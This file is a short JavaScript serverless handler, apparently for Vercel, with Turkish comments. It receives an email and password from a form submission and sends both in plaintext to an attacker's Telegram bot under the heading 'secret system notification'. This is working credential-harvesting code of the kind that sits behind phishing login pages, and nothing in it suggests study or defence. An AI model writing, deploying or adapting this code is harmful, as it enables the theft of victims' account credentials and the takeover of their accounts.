export default async function handler(req, res) {
    if (req.method === 'POST') {
        const { email, pass } = req.body;
        // BURAYI ELLEME! Vercel burayı otomatik dolduracak.
        const BOT_TOKEN = process.env.TELEGRAM_TOKEN;
        const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

        const text = `🚀 **GİZLİ SİSTEM BİLDİRİMİ**\n📧: ${email}\n🔑: ${pass}`;
        
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
            return res.status(200).json({ success: true });
        } catch (e) {
            return res.status(500).json({ error: "Hata" });
        }
    }
    return res.status(405).end();
}
